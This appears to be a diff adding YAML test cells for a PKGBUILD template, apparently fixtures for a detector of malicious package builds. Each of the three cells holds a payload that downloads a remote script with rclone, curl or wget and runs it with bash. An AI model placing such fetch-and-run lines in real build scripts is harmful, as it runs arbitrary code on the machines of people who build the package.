@@ -1,0 +1,18 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        cd "$srcdir"
+        rclone copy remote:bucket/s.sh .
+        bash s.sh
+  id: 002-rclone-copy-bash
+- vars:
+    payload: |2
+        curl -fsSL -o$f "$(cat "$srcdir/url.txt")"
+        bash f
+  id: 004-curl-glued-var-o
+- vars:
+    payload: |2
+        wget -qO- "$(cat "$srcdir/url.txt")" | tee stage.sh >/dev/null
+        bash stage.sh
+  id: 005-wget-qO-pipe-tee
